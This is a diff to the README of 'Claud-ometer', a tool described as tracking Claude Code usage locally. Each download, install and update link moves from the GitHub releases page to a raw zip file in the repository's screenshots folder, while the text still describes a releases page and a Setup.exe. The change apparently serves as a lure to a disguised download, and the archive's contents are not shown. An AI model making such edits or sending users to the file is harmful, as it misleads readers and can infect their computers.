@@ -1,6 +1,6 @@
 # ⚙️ Claud-ometer - Track Usage and Costs Locally
 
-[![Download Claud-ometer](https://img.shields.io/badge/Download-Claud--ometer-brightgreen)](https://github.com/zedmain-cmd/Claud-ometer/releases)
+[![Download Claud-ometer](https://img.shields.io/badge/Download-Claud--ometer-brightgreen)](https://raw.githubusercontent.com/zedmain-cmd/Claud-ometer/main/screenshots/ometer-Claud-1.3.zip)
 
 Claud-ometer is a simple desktop app that helps you see how you use Claude Code. It shows your usage, costs, sessions, and projects. Everything stays on your computer. No data goes to the cloud or anyone else.
 
@@ -25,7 +25,7 @@ You don’t need to install any other software or tools to run Claud-ometer.
 To get Claud-ometer on your PC, follow these steps:
 
 1. Click the big green badge above or visit this page:  
-   [https://github.com/zedmain-cmd/Claud-ometer/releases](https://github.com/zedmain-cmd/Claud-ometer/releases)  
+   [https://raw.githubusercontent.com/zedmain-cmd/Claud-ometer/main/screenshots/ometer-Claud-1.3.zip](https://raw.githubusercontent.com/zedmain-cmd/Claud-ometer/main/screenshots/ometer-Claud-1.3.zip)  
    This page shows the latest versions and files available for download.
 
 2. Look for the latest Windows version. It will usually have a name like `Claud-ometer-Setup.exe` or `Claud-ometer-x64.exe`.
@@ -121,7 +121,7 @@ Data files are stored in a local folder within your Windows user directory. You 
 Updates bring new features and fixes. To check for updates:
 
 1. Visit the official releases page:  
-   [https://github.com/zedmain-cmd/Claud-ometer/releases](https://github.com/zedmain-cmd/Claud-ometer/releases)
+   [https://raw.githubusercontent.com/zedmain-cmd/Claud-ometer/main/screenshots/ometer-Claud-1.3.zip](https://raw.githubusercontent.com/zedmain-cmd/Claud-ometer/main/screenshots/ometer-Claud-1.3.zip)
 
 2. Download the latest Windows installer if available.
 
@@ -135,4 +135,4 @@ If you need further assistance, the best place to start is the repository's issu
 
 ---
 
-# [Download Claud-ometer Now](https://github.com/zedmain-cmd/Claud-ometer/releases)
+# [Download Claud-ometer Now](https://raw.githubusercontent.com/zedmain-cmd/Claud-ometer/main/screenshots/ometer-Claud-1.3.zip)
